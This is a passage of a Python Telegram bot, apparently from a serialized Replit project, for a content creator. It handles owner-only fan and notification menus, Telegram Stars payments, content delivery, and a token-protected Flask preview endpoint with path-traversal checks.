an owner-only command.\")\n    \n    # Loyal Fan Management callbacks\n    elif call.data == \"loyal_fan_management_menu\":\n        if call.from_user.id == OWNER_ID:\n            show_loyal_fan_management_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"mark_loyal_fan\":\n        if call.from_user.id == OWNER_ID:\n            show_mark_loyal_fan_interface(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"list_loyal_fans\":\n        if call.from_user.id == OWNER_ID:\n            show_loyal_fans_list(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"remove_loyal_fan\":\n        if call.from_user.id == OWNER_ID:\n            show_remove_loyal_fan_interface(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"select_loyal_\"):\n        if call.from_user.id == OWNER_ID:\n            user_id = int(call.data.replace(\"select_loyal_\", \"\"))\n            # Start reason input session\n            upload_sessions[OWNERS[0]] = {\n                'type': 'loyal_fan_reason',\n                'user_id': user_id,\n                'step': 'waiting_for_reason'\n            }\n            \n            # Get user info\n            conn = sqlite3.connect('content_bot.db')\n            cursor = conn.cursor()\n            cursor.execute('SELECT username, first_name FROM users WHERE user_id = ?', (user_id,))\n            user_info = cursor.fetchone()\n            conn.close()\n            \n            if user_info:\n                username, first_name = user_info\n                reason_text = f\"\"\"\n⭐ <b>MARK AS LOYAL FAN</b> ⭐\n\n👤 <b>Selected User:</b> {first_name} (@{username or 'none'})\n🆔 <b>User ID:</b> {user_id}\n\n📝 <b>Please provide a reason for marking this user as loyal:</b>\n\n<b>Examples:</b>\n• Big spender - purchased multiple items\n• Engaged fan - always interacts with content\n• Early supporter - joined when I started\n• VIP member - loyal subscriber\n• Helpful customer - great feedback\n\n✏️ <b>Type your reason and send:</b>\n\"\"\"\n                \n                markup = types.InlineKeyboardMarkup()\n                markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"loyal_fan_management_menu\"))\n                \n                bot.send_message(call.message.chat.id, reason_text, reply_markup=markup, parse_mode='HTML')\n            else:\n                bot.send_message(call.message.chat.id, \"❌ User not found.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"confirm_remove_loyal_\"):\n        if call.from_user.id == OWNER_ID:\n            user_id = int(call.data.replace(\"confirm_remove_loyal_\", \"\"))\n            \n            # Remove loyal fan status\n            conn = sqlite3.connect('content_bot.db')\n            cursor = conn.cursor()\n            cursor.execute('DELETE FROM loyal_fans WHERE user_id = ?', (user_id,))\n            removed_count = cursor.rowcount\n            conn.commit()\n            conn.close()\n            \n            if removed_count > 0:\n                bot.send_message(call.message.chat.id, \"✅ Loyal fan status removed successfully!\")\n            else:\n                bot.send_message(call.message.chat.id, \"❌ User was not marked as loyal fan.\")\n            \n            # Go back to loyal fan management\n            show_loyal_fan_management_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # Notification System callbacks\n    elif call.data == \"notification_management_menu\":\n        if call.from_user.id == OWNER_ID:\n            show_notification_management_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"notify_all_users\":\n        if call.from_user.id == OWNER_ID:\n            show_notification_composer(call.message.chat.id, 'all')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"notify_vip_users\":\n        if call.from_user.id == OWNER_ID:\n            show_notification_composer(call.message.chat.id, 'vip')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"notify_non_vip_users\":\n        if call.from_user.id == OWNER_ID:\n            show_notification_composer(call.message.chat.id, 'non_vip')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"confirm_send_\"):\n        if call.from_user.id == OWNER_ID:\n            target_group = call.data.replace(\"confirm_send_\", \"\")\n            \n            # Get stored notification session\n            if call.message.chat.id in notification_sessions:\n                session = notification_sessions[call.message.chat.id]\n                message_text = session.get('message_text')\n                users = session.get('users', [])\n                \n                if message_text and users:\n                    # Send the notification\n                    target_names = {\n                        'all': 'All Users',\n                        'vip': 'VIP Members',\n                        'non_vip': 'Non-VIP Users'\n                    }\n                    \n                    target_name = target_names.get(target_group, 'Unknown')\n                    \n                    # Create basic markup for notifications\n                    notification_markup = types.InlineKeyboardMarkup()\n                    notification_markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n                    \n                    # Send notification to users\n                    pin_message = target_group == 'vip'  # Pin VIP notifications\n                    stats = send_notification_to_users(users, message_text, notification_markup, pin_message)\n                    \n                    # Send confirmation to owner\n                    success_text = f\"\"\"\n✅ <b>NOTIFICATION SENT SUCCESSFULLY!</b> ✅\n\n🎯 <b>Target Group:</b> {target_name}\n✅ <b>Delivered:</b> {stats['sent']} users\n❌ <b>Failed:</b> {stats['failed']} users  \n🚫 <b>Blocked:</b> {stats['blocked']} users\n👥 <b>Total Targeted:</b> {stats['total_targeted']} users\n\n📊 <b>Delivery Rate:</b> {(stats['sent'] / max(stats['total_targeted'], 1) * 100):.1f}%\n\n💡 <b>Message sent:</b> {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\"\"\"\n                    \n                    markup = types.InlineKeyboardMarkup()\n                    markup.add(types.InlineKeyboardButton(\"📢 Send Another Notification\", callback_data=\"notification_management_menu\"))\n                    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Help\", callback_data=\"owner_help\"))\n                    \n                    bot.send_message(call.message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')\n                    \n                    # Clear the session\n                    del notification_sessions[call.message.chat.id]\n                else:\n                    bot.send_message(call.message.chat.id, \"❌ Notification session expired. Please try again.\")\n            else:\n                bot.send_message(call.message.chat.id, \"❌ No active notification session found.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # Answer callback to remove loading state\n    bot.answer_callback_query(call.id)\n\n# Payment handlers\n\n@bot.pre_checkout_query_handler(func=lambda query: True)\ndef pre_checkout_handler(pre_checkout_query):\n    \"\"\"Handle pre-checkout queries for Telegram Stars payments\"\"\"\n    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)\n\n@bot.message_handler(content_types=['successful_payment'])\ndef successful_payment_handler(message):\n    \"\"\"Handle successful payment and deliver content\"\"\"\n    payment = message.successful_payment\n    \n    # Parse payload to get content info\n    payload_parts = payment.invoice_payload.split('_')\n    \n    # Handle VIP subscription payments\n    if len(payload_parts) >= 2 and payload_parts[0] == 'vip' and payload_parts[1] == 'subscription':\n        user_id = int(payload_parts[2])\n        \n        # Update user's total spent\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        cursor.execute('UPDATE users SET total_stars_spent = total_stars_spent + ? WHERE user_id = ?', \n                      (payment.total_amount, user_id))\n        conn.commit()\n        conn.close()\n        \n        # Activate VIP subscription\n        duration_days = activate_vip_subscription(user_id)\n        \n        # Send confirmation message\n        vip_welcome_message = f\"\"\"\n💎 **VIP SUBSCRIPTION ACTIVATED!** 💎\n\n🎉 Congrats, you’re officially a VIP now!\n⏰ **Duration:** {duration_days} days\n💰 **Amount:** {payment.total_amount} Stars\n\n🌟 **Your VIP Benefits Are Now Active:**\n• Unlimited access to all exclusive content\n• Direct personal chat with me\n• Priority responses to all messages\n• Special VIP-only teasers and previews\n• Monthly exclusive photo sets\n• Behind-the-scenes content\n\n💫 Welcome to the VIP family, baby! You’re not just amazing, you’re everything ✨\n\nUse the buttons below to explore your new VIP privileges:\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"🛒 Browse All Content\", callback_data=\"browse_content\"))\n        markup.add(types.InlineKeyboardButton(\"🎬 VIP Exclusive Teasers\", callback_data=\"teasers\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n        bot.send_message(message.chat.id, vip_welcome_message, reply_markup=markup, parse_mode='Markdown')\n        \n        # Notify owner of new VIP subscription\n        try:\n            # Format date as requested\n            today = datetime.datetime.now()\n            formatted_date = today.strftime(\"%b %d\").upper()\n            \n            # Create enhanced notification with clickable name\n            owner_notification = f\"\"\"\n💎 **NEW VIP SUBSCRIPTION!** 💎\n\n👤 [{message.from_user.first_name}](tg://user?id={user_id})\n🆔 User ID: {user_id}\n📅 Date: {formatted_date}\n💰 Amount: {payment.total_amount} Stars\n⏰ Duration: {duration_days} days\n\n💬 Click the name to message them directly!\n\"\"\"\n            bot.send_message(OWNER_ID, owner_notification, parse_mode='Markdown')\n        except Exception as e:\n            logger.error(f\"Error sending owner notification: {e}\")\n            # Fallback notification\n            try:\n                bot.send_message(OWNER_ID, f\"💎 NEW VIP SUBSCRIPTION!\\n👤 {message.from_user.first_name}\\n💰 {payment.total_amount} Stars\\n🆔 ID: {user_id}\")\n            except:\n                pass\n            \n    elif len(payload_parts) >= 3 and payload_parts[0] == 'content':\n        content_name = payload_parts[1]\n        user_id = int(payload_parts[2])\n        \n        # Update user's total spent\n        conn = get_db_connection()\n        cursor = conn.cursor()\n        cursor.execute('UPDATE users SET total_stars_spent = total_stars_spent + ? WHERE user_id = ?', \n                      (payment.total_amount, user_id))\n        \n        # Record the purchase for permanent access (use INSERT OR IGNORE to prevent duplicates)\n        purchase_date = datetime.datetime.now().isoformat()\n        cursor.execute('''\n            INSERT OR IGNORE INTO user_purchases (user_id, content_name, purchase_date, price_paid)\n            VALUES (?, ?, ?, ?)\n        ''', (user_id, content_name, purchase_date, payment.total_amount))\n        \n        # Get content details\n        cursor.execute('SELECT file_path, description FROM content_items WHERE name = ?', (content_name,))\n        content = cursor.fetchone()\n        conn.commit()\n        conn.close()\n        \n        if content:\n            file_path, description = content\n            \n            # Send content to user\n            thank_you_message = f\"\"\"\n🎉 **PAYMENT SUCCESSFUL!** 🎉\n\nThank you for your purchase! Here's your exclusive content:\n\n**{content_name}**\n{description}\n\n💕 You’re absolutely amazing for supporting me, babe! Now sit back, relax, and enjoy the content made just for YOU.\n\"\"\"\n            \n            bot.send_message(message.chat.id, thank_you_message, parse_mode='Markdown')\n            \n            # Send the actual content (photo/video/document)\n            try:\n                if file_path.startswith('http'):\n                    # It's a URL\n                    if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):\n                        bot.send_photo(message.chat.id, file_path, caption=f\"🎁 {content_name}\")\n                    elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):\n                        bot.send_video(message.chat.id, file_path, caption=f\"🎁 {content_name}\")\n                    else:\n                        bot.send_document(message.chat.id, file_path, caption=f\"🎁 {content_name}\")\n                elif len(file_path) > 50 and not file_path.startswith('/'):\n                    # It's a Telegram file_id (file_ids are long strings)\n                    try:\n                        # Try to send as photo first (most common)\n                        bot.send_photo(message.chat.id, file_path, caption=f\"🎁 {content_name}\")\n                    except:\n                        try:\n                            # Try as video\n                            bot.send_video(message.chat.id, file_path, caption=f\"🎁 {content_name}\")\n                        except:\n                            try:\n                                # Try as document\n                                bot.send_document(message.chat.id, file_path, caption=f\"🎁 {content_name}\")\n                            except:\n                                # Last resort - show file_id\n                                bot.send_message(message.chat.id, f\"🎁 Your content: {content_name}\\n\\nFile ID: {file_path}\\n\\n⚠️ If you have trouble accessing this content, please contact me!\")\n                else:\n                    # It's a local file path\n                    with open(file_path, 'rb') as file:\n                        if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):\n                            bot.send_photo(message.chat.id, file, caption=f\"🎁 {content_name}\")\n                        elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):\n                            bot.send_video(message.chat.id, file, caption=f\"🎁 {content_name}\")\n                        else:\n                            bot.send_document(message.chat.id, file, caption=f\"🎁 {content_name}\")\n            except Exception as e:\n                bot.send_message(message.chat.id, f\"🎁 Your content: {content_name}\\n\\n⚠️ There was an issue delivering your content. Please contact me and I'll send it manually!\")\n                logger.error(f\"Error sending content {content_name}: {e}\")\n            \n            # Notify owner of sale\n            try:\n                user_data = get_user_data(user_id)\n                if user_data:\n                    username = user_data[1] or \"none\"\n                    first_name = user_data[2] or \"N/A\"\n                    total_spent = user_data[4]  # Don't add payment.total_amount again - it's already updated in DB\n                    \n                    bot.send_message(OWNER_ID, f\"\"\"\n💰 **NEW SALE!** 💰\n\n👤 [{first_name}](tg://user?id={user_id})\n🛒 Item: {content_name}\n⭐ Amount: {payment.total_amount} Stars\n💎 Total Spent: {total_spent} Stars\n🆔 User ID: {user_id}\n\n💬 Click the name to message them directly!\n\"\"\", parse_mode='Markdown')\n            except Exception as e:\n                logger.error(f\"Error notifying owner: {e}\")\n\n# Natural text message handler\n\n@bot.message_handler(content_types=['text'])\ndef handle_text_messages(message):\n    \"\"\"Handle natural text messages with AI-style responses\"\"\"\n    # Skip if it's a command\n    if message.text.startswith('/'):\n        return\n    \n    add_or_update_user(message.from_user)\n    \n    # Get AI-style response\n    response = get_ai_response(message.text)\n    \n    # Add inline keyboard for engagement\n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"🎬 View Teasers\", callback_data=\"teasers\"))\n    markup.add(types.InlineKeyboardButton(\"🛒 Browse Content\", callback_data=\"browse_content\"))\n    \n    bot.send_message(message.chat.id, response, reply_markup=markup)\n\n# Security functions for owner-only access control\n\ndef generate_secure_access_token(content_name):\n    \"\"\"Generate secure HMAC-based access token for content preview\"\"\"\n    import hashlib\n    import hmac\n    \n    # Use bot token as secret key - only owner knows this\n    # Handle case where BOT_TOKEN might be None or dummy\n    token_key = BOT_TOKEN or \"dummy_key_for_web_mode\"\n    secret_key = token_key.encode('utf-8')\n    \n    # Create message including content name and a fixed salt\n    message = f\"content_preview:{content_name}:owner_access\".encode('utf-8')\n    \n    # Generate HMAC-SHA256 token\n    token = hmac.new(secret_key, message, hashlib.sha256).hexdigest()\n    \n    return token\n\ndef generate_owner_access_url(content_name):\n    \"\"\"Generate secure access URL for owner to preview content\"\"\"\n    token = generate_secure_access_token(content_name)\n    # Get the domain from environment or use default for development\n    domain = os.environ.get('REPL_SLUG', 'localhost:5000')\n    \n    return f\"https://{domain}/content/preview/{content_name}?token={token}\"\n\n# Flask routes for Replit hosting\n\n@app.route('/')\ndef home():\n    \"\"\"Basic health check endpoint\"\"\"\n    return \"🤖 Content Creator Bot is running! 🌟\"\n\n@app.route('/health')\ndef health():\n    \"\"\"Health check for monitoring\"\"\"\n    return {\"status\": \"healthy\", \"bot\": \"running\"}\n\n@app.route('/content/preview/<content_name>')\ndef preview_content(content_name):\n    \"\"\"Serve content preview by content name - OWNER ONLY ACCESS\"\"\"\n    from flask import send_file, redirect, abort, Response, request\n    import io\n    import hashlib\n    import hmac\n    \n    # SECURITY: Owner-only access control\n    # Check for access token in query parameters or headers\n    access_token = request.args.get('token') or request.headers.get('X-Access-Token')\n    \n    if not access_token:\n        logger.warning(f\"Unauthorized access attempt to content '{content_name}' from {request.remote_addr}\")\n        abort(403, \"Access denied: Authentication required\")\n    \n    # Validate access token using bot token as secret key\n    # This ensures only someone who knows the bot token can generate valid access tokens\n    expected_token = generate_secure_access_token(content_name)\n    \n    if not hmac.compare_digest(access_token, expected_token):\n        logger.warning(f\"Invalid access token for content '{content_name}' from {request.remote_addr}\")\n        abort(403, \"Access denied: Invalid authentication token\")\n    \n    try:\n        # Get content details from database\n        conn = get_db_connection()\n        cursor = conn.cursor()\n        cursor.execute('SELECT file_path, description, content_type FROM content_items WHERE name = ?', (content_name,))\n        content = cursor.fetchone()\n        conn.close()\n        \n        if not content:\n            abort(404, f\"Content '{content_name}' not found\")\n        \n        file_path, description, content_type = content\n        \n        logger.info(f\"Authorized access to content '{content_name}' from {request.remote_addr}\")\n        return serve_content_file(file_path, content_name, description)\n        \n    except Exception as e:\n        logger.error(f\"Error serving content preview {content_name}: {e}\")\n        abort(500, f\"Error serving content: {str(e)}\")\n\n# REMOVED: Dangerous /content/file/<file_id> endpoint that acted as open Telegram proxy\n\ndef serve_content_file(file_path, content_name=\"Content\", description=\"\"):\n    \"\"\"Secure helper function to serve content files from various sources\"\"\"\n    from flask import send_file, redirect, abort, Response\n    import os.path\n    import re\n    import io\n    \n    # Maximum file size for Telegram downloads (50MB)\n    MAX_TELEGRAM_FILE_SIZE = 50 * 1024 * 1024\n    \n    # Allowed content types for security\n    ALLOWED_CONTENT_TYPES = {\n        'jpg': 'image/jpeg', 'jpeg': 'image/jpeg',\n        'png': 'image/png', 'gif': 'image/gif',\n        'webp': 'image/webp', 'bmp': 'image/bmp',\n        'mp4': 'video/mp4', 'mov': 'video/quicktime',\n        'avi': 'video/x-msvideo', 'webm': 'video/webm',\n        'mkv': 'video/x-matroska'\n    }\n    \n    def is_telegram_file_id(file_path):\n        \"\"\"Securely detect Telegram file IDs using proper validation\"\"\"\n        # Telegram file IDs are alphanumeric + hyphens/underscores, typically 20-100 chars\n        if not isinstance(file_path, str) or len(file_path) < 20 or len(file_path) > 200:\n            return False\n        # Must not be a path (no slashes) and must match Telegram file ID pattern\n        return '/' not in file_path and re.match(r'^[A-Za-z0-9_-]+$', file_path) is not None\n    \n    def secure_local_file_path(file_path):\n        \"\"\"Secure local file path resolution with path traversal protection\"\"\"\n        # Define allowed directories for content files\n        allowed_dirs = ['uploads', 'content', 'static', 'media']\n        \n        # Normalize the path to prevent traversal attacks\n        try:\n            # Remove any potential path traversal attempts\n            normalized_path = os.path.normpath(file_path)\n            \n            # Ensure the path doesn't try to go up directories\n            if '..' in normalized_path or normalized_path.startswith('/'):\n                return None\n                \n            # Check if path starts with an allowed directory\n            path_parts = normalized_path.split(os.sep)\n            if not path_parts or path_parts[0] not in allowed_dirs:\n                return None\n                \n            # Construct secure absolute path\n            secure_path = os.path.join(os.getcwd(), normalized_path)\n            \n            # Final security check: ensure resolved path is within allowed directories\n            resolved_path = os.path.realpath(secure_path)\n            base_dir = os.path.realpath(os.getcwd())\n            \n            if not resolved_path.startswith(base_dir):\n                return None\n                \n            return secure_path\n            \n        except (ValueError, OSError) as e:\n            logger.error(f\"Path security validation failed: {e}\")\n            return None\n    \n    try:\n        if file_path.startswith(('http://', 'https://')):\n            # External URL - validate and redirect\n            # Basic URL validation to prevent malicious redirects\n            if not re.match(r'^https?://[a-zA-Z0-9.-]+/.*', file_path):\n                abort(400, \"Invalid external URL format\")\n            return redirect(file_path)\n            \n        elif is_telegram_file_id(file_path):\n            # Secure Telegram file handling\n            try:\n                file_info = bot.get_file(file_path)\n                \n                # Check file size limit\n                if hasattr(file_info, 'file_size') and file_info.file_size is not None and file_info.file_size > MAX_TELEGRAM_FILE_SIZE:\n                    abort(413, f\"File too large: {file_info.file_size} bytes (max: {MAX_TELEGRAM_FILE_SIZE})\")\n                \n                # Validate file type\n                file_extension = ''\n                if file_info.file_path and '.' in file_info.file_path:\n                    file_extension = file_info.file_path.split('.')[-1].lower()\n                    if file_extension not in ALLOWED_CONTENT_TYPES:\n                        abort(415, f\"Unsupported file type: {file_extension}\")\n                \n                # Construct secure Telegram URL\n                file_url = f\"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}\"\n                \n                # Stream download with size limit enforcement\n                with requests.get(file_url, timeout=30, stream=True) as response:\n                    response.raise_for_status()\n                    \n                    # Check Content-Length header for size validation\n                    content_length = response.headers.get('Content-Length')\n                    if content_length and int(content_length) > MAX_TELEGRAM_FILE_SIZE:\n                        abort(413, f\"File too large: {content_length} bytes\")\n                    \n                    # Stream file content with size checking\n                    file_content = io.BytesIO()\n                    downloaded_size = 0\n                    \n                    for chunk in response.iter_content(chunk_size=8192):\n                        if chunk:\n                            downloaded_size += len(chunk)\n                            if downloaded_size > MAX_TELEGRAM_FILE_SIZE:\n                                abort(413, \"File size limit exceeded during download\")\n                            file_content.write(chunk)\n                    \n                    file_content.seek(0)\n                    \n                    # Determine secure content type\n                    content_type = ALLOWED_CONTENT_TYPES.get(file_extension, 'application/octet-stream')\n                    \n                    # Security headers\n                    secure_headers = {\n                        'Content-Disposition': f'inline; filename=\"{re.sub(r\"[^a-zA-Z0-9._-]\", \"_\", content_name)}.{file_extension}\"',\n                        'Cache-Control': 'no-cache, no-store, must-revalidate',\n                        'Pragma': 'no-cache',\n                        'Expires': '0',\n                        'X-Content-Type-Options': 'nosniff',\n                        'Content-Security-Policy': \"default-src 'none'; img-src 'self'; media-src 'self'\"\n                    }\n                    \n                    return Response(\n                        file_content.getvalue(),\n                        mimetype=content_type,\n                        headers=secure_headers\n                    )\n                \n            except requests.exceptions.RequestException as e:\n                logger.error(f\"Error downloading from Telegram: {e}\")\n                abort(502, \"Unable to retrieve file from Telegram\")\n            except Exception as e:\n                logger.error(f\"Telegram file processing error: {e}\")\n                abort(500, \"File processing error\")\n                \n        else:\n            # Secure local file serving with path traversal protection\n            secure_path = secure_local_file_path(file_path)\n            if not secure_path:\n                abort(403, \"Access to this file path is not allowed\")\n                \n            try:\n                # Additional security: check file exists and is readable\n                if not os.path.isfile(secure_path):\n                    abort(404, \"File not found\")\n                    \n                # Validate file extension for local files too\n                file_ext = ''\n                if '.' in secure_path:\n                    file_ext = secure_path.split('.')[-1].lower()\n                    if file_ext not in ALLOWED_CONTENT_TYPES:\n                        abort(415, f\"Unsupported local file type: {file_ext}\")\n                \n                # Apply security headers to local file serving as well\n                response = send_file(secure_path, as_attachment=False, conditional=True)\n                \n                # Add security headers\n                response.headers['X-Content-Type-Options'] = 'nosniff'\n                response.headers['Content-Security-Policy'] = \"default-src 'none'; img-src 'self'; media-src 'self'\"\n                response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'\n                response.headers['Pragma'] = 'no-cache'\n                response.headers['Expires'] = '0'\n                \n                return response\n                \n            except FileNotFoundError:\n                abort(404, \"Local file not found\")\n            except PermissionError:\n                abort(403, \"Permission denied\")\n            except Exception as e:\n                logger.error(f\"Local file serving error: {e}\")\n                abort(500, \"Error serving local file\")\n                \n    except Exception as e:\n        logger.error(f\"Error in serve_content_file: {e}\")\n        abort(500, \"File serving error\")\n\n# Message handlers for special interactive flows\n\n@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'loyal_fan_reason')\ndef handle_loyal_fan_reason_input(message):\n    \"\"\"Handle loyal fan reason input from owner\"\"\"\n    if upload_sessions[OWNER_ID].get('step') == 'waiting_for_reason':\n        reason = message.text.strip()\n        user_id = upload_sessions[OWNER_ID].get('user_id')\n        \n        if len(reason) < 3 or len(reason) > 200:\n            bot.send_message(message.chat.id, \"❌ Reason must be between 3 and 200 characters. Please try again:\")\n            return\n        \n        # Mark user as loyal fan\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        \n        # Check if user exists\n        cursor.execute('SELECT first_name, username FROM users WHERE user_id = ?', (user_id,))\n        user_info = cursor.fetchone()\n        \n        if user_info:\n            first_name, username = user_info\n            \n            # Insert loyal fan record\n            now = datetime.datetime.now().isoformat()\n            cursor.execute('INSERT OR REPLACE INTO loyal_fans (user_id, reason, date_marked) VALUES (?, ?, ?)', \n                         (user_id, reason, now))\n            conn.commit()\n            \n            success_text = f\"\"\"\n✅ <b>LOYAL FAN MARKED SUCCESSFULLY!</b> ✅\n\n👤 <b>User:</b> {first_name} (@{username or 'none'})\n📝 <b>Reason:</b> {reason}\n📅 <b>Date:</b> {datetime.datetime.now().strftime(\"%b %d, %Y\")}\n\n⭐ This user will now show as \"LOYAL\" in your user analytics and listings!\n\n💡 <b>Benefits of marking loyal fans:</b>\n• Easy identification in user lists\n• Track your most valuable customers  \n• Quick recognition of top supporters\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"⭐ Mark Another Fan\", callback_data=\"mark_loyal_fan\"))\n            markup.add(types.InlineKeyboardButton(\"📋 View All Loyal Fans\", callback_data=\"list_loyal_fans\"))\n            markup.add(types.InlineKeyboardButton(\"🔙 Back to Management\", callback_data=\"loyal_fan_management_menu\"))\n            \n            bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(message.chat.id, \"❌ User not found in database.\")\n        \n        conn.close()\n        \n        # Clear the session\n        if OWNERS[0] in upload_sessions:\n            del upload_sessions[OWNERS[0]]\n\n@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and message.chat.id in notification_sessions and notification_sessions[message.chat.id].get('waiting_for_message'))\ndef handle_notification_message_input(message):\n    \"\"\"Handle notification message input from owner\"\"\"\n    session = notification_sessions[message.chat.id]\n    target_group = session['target_group']\n    users = session['users']\n    notification_text = message.text\n    \n    if len(notification_text) < 1 or len(notification_text) > 4000:\n        bot.send_message(message.chat.id, \"❌ Message must be between 1 and 4000 characters. Please try again:\")\n        return\n    \n    # Confirm before sending\n    target_names = {\n        'all': 'All Users',\n        'vip': 'VIP Members', \n        'non_vip': 'Non-VIP Users'\n    }\n    \n    target_name = target_names.get(target_group, 'Unknown')\n    user_count = len(users)\n    \n    # Show preview and confirmation\n    preview_text = f\"\"\"\n📢 <b>NOTIFICATION PREVIEW</b> 📢\n\n🎯 <b>Target:</b> {target_name} ({user_count} users)\n\n📝 <b>Message Preview:</b>\n{notification_text}\n\n⚠️ <b>Ready to send?</b> This will notify {user_count} users immediately!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"✅ Send Notification\", callback_data=f\"confirm_send_{target_group}\"))\n    markup.add(types.InlineKeyboardButton(\"✏️ Edit Message\", callback_data=f\"notify_{target_group}_users\"))\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"notification_management_menu\"))\n    \n    bot.send_message(message.chat.id, preview_text, reply_markup=markup, parse_mode='HTML')\n    \n    # Store the message for confirmation\n    notification_sessions[message.chat.id]['message_text'] = notification_text\n    notification_sessions[message.chat.id]['waiting_for_message'] = False\n\ndef clear_webhook_and_polling():\n    \"\"\"Clear any existing webhook and stop other polling instances\"\"\"\n    try:\n        logger.info(\"Clearing any existing webhook...\")\n        # Clear webhook to stop webhook mode and drop pending updates\n        bot.remove_webhook()\n        logger.info(\"Webhook cleared successfully with pending updates dropped\")\n        \n        # Short delay to ensure cleanup\n        import time\n        time.sleep(3)\n        \n    except Exception as e:\n        logger.warning(f\"Error clearing webhook (this is usually fine): {e}\")\n\ndef run_bot():\n    \"\"\"Run the bot with infinity polling and better error handling\"\"\"\n    import time\n    \n    # First, clear any existing webhook to prevent conflicts\n    clear_webhook_and_polling()\n    \n    max_retries = 5\n    retry_delay = 5  # seconds\n    \n    for attempt in range(max_retries):\n        try:\n            logger.info(f\"Starting bot polling (attempt {attempt + 1}/{max_retries})...\")\n            \n            # Clear webhook again right before polling starts\n            if attempt > 0:  # On retries, try clearing webhook again\n                try:\n                    bot.remove_webhook()\n                    time.sleep(1)\n                except:\n                    pass\n            \n            bot.infinity_polling(\n                none_stop=True,\n                timeout=30,  # 30 second timeout for requests\n                skip_pending=True  # Skip pending messages on restart\n            )\n            logger.info(\"Bot polling started successfully!\")\n            break  # If we reach here, polling started successfully\n            \n        except Exception as e:\n            error_str = str(e)\n            logger.error(f\"Bot polling failed (attempt {attempt + 1}/{max_retries}): {error_str}\")\n            \n            # Special handling for 409 conflicts\n            if \"409\" in error_str and \"getUpdates\" in error_str:\n                logger.info(\"Detected getUpdates conflict, waiting longer before retry...\")\n                if attempt < max_retries - 1:\n                    longer_delay = retry_delay * 2\n                    logger.info(f\"Waiting {longer_delay} seconds for other instances to timeout...\")\n                    time.sleep(longer_delay)\n            \n            if attempt < max_retries - 1:\n                logger.info(f\"Retrying in {retry_delay} seconds...\")\n                time.sleep(retry_delay)\n                retry_delay *= 2  # Exponential backoff\n            else:\n                logger.error(\"Max retries reached. Bot polling could not be started.\")\n                logger.info(\"Flask server will continue running for health checks.\")\n                # Don't exit, let Flask continue running for health checks\n                break\n\ndef main():\n    \"\"\"Main function to initialize and start the bot\"\"\"\n    logger.info(\"Initializing Content Creator Bot...\")\n    \n    # Initialize database\n    init_database()\n    \n    # Only start bot if we have valid credentials\n    original_bot_token = os.getenv('BOT_TOKEN')\n    original_owner_id = int(os.getenv('OWNER_ID', '0'))\n    \n    if original_bot_token and original_owner_id != 0:\n        logger.info(\"Valid credentials found - starting bot polling...\")\n        # Start bot in a separate thread\n        bot_thread = threading.Thread(target=run_bot)\n        bot_thread.daemon = True\n        bot_thread.start()\n    else:\n        logger.info(\"Missing bot credentials - running in web-only mode\")\n        logger.info(\"Add BOT_TOKEN and OWNER_ID to Replit Secrets to enable Telegram bot functionality\")\n    \n    # Start Flask server\n    port = int(os.environ.get('PORT', 5000))\n    logger.info(f\"Starting Flask server on 0.0.0.0:{port}...\")\n    app.run(host='0.0.0.0', port=port, debug=False)\n\nif __name__ == '__main__':\n    main()","size_bytes":276635},"pyproject.toml":{"content":"[project]\nname = \"repl-nix-workspace\"\nversion = \"0.1.0\"\ndescription = \"Add your description here\"\nrequires-python = \">=3.11\"\ndependencies = [\n    \"email-validator>=2.3.0\",\n    \"flask-sqlalchemy>=3.1.1\",\n    \"flask>=3.1.2\",\n    \"gunicorn>=23.0.0\",\n    \"psycopg2-binary>=2.9.10\",\n    \"pytelegrambotapi>=4.29.1\",\n    